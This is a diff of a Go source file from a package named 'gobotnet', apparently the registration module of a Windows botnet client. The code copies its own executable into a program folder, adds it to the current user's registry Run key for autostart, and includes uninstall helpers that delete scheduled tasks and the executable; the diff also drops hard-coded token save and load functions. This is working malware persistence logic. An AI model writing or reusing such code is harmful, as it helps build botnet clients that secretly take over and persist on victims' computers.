@@ -3,7 +3,6 @@ package gobotnet
 import (
 	"fmt"
 	"golang.org/x/sys/windows/registry"
-	"io/ioutil"
 	"os"
 )
 
@@ -13,34 +12,24 @@ var (
 	copyExecFilePath   string = copyProgramDir + `\` + programName + ".exe"
 	tokenFile          string = copyProgramDir + `\` + programName + ".txt"
 	sourceExecFilePath string = os.Args[0]
-	token              string = "sfdsfdsfsdfsdgfdg4343643643"
+	token              string = ""
 )
 
-func RegTest() {
-	fmt.Println("REGISTRATION.GO TEST")
-
-	// CreateDir(copyProgramDir, 0777)
-	// if !CheckFileExist(tokenFile) {
-	// 	CreateFile(tokenFile)
-	// 	SaveToken(tokenFile, token)
-	// 	//CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
-	// } else {
-
-	// }
+func RegistrationTest() {
+	fmt.Println("Test Registration Start")
+	fmt.Println("Test Registration End")
 }
 
 func RegisterProgram() {
 	CreateDir(copyProgramDir, 0777)
-	err := CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
-	OutMessage(err.Error())
-	err = RegisterAutoRun()
-	OutMessage(err.Error())
+	CopyFileToDirectory(sourceExecFilePath, copyExecFilePath)
+	RegisterAutoRun()
 }
 
 func UnRegisterProgram() {
 	UnRegisterAutoRun()
 	DeleteFile(sourceExecFilePath)
-	DeleteFile(copyExecFilePath)
+	RemoveDirWithContet(copyProgramDir)
 }
 
 func RegisterAutoRun() error {
@@ -48,9 +37,8 @@ func RegisterAutoRun() error {
 	return err
 }
 
-func IsRegisterAutoRun() error {
-	err := IsValueSetRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
-	return err
+func IsRegisterAutoRun() bool {
+	return CheckSetValueRegistryKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, programName)
 }
 
 func UnRegisterAutoRun() {
@@ -67,21 +55,4 @@ func IsRegisterSchedule(nameTask string) ([]byte, error) {
 
 func UnRegisterSchedule(nameTask string) ([]byte, error) {
 	return CmdExec("schtasks /delete /f /tn " + nameTask)
-}
-
-func SaveToken(pathFile, token string) error {
-	err := ioutil.WriteFile(pathFile, []byte(token), 0644)
-	if err != nil {
-		OutMessage(err.Error())
-	}
-	return err
-}
-
-func LoadToken(pathFile string) string {
-	readBytes, err := ioutil.ReadFile(tokenFile)
-	if err != nil {
-		OutMessage(err.Error())
-		return ""
-	}
-	return string(readBytes)
 }
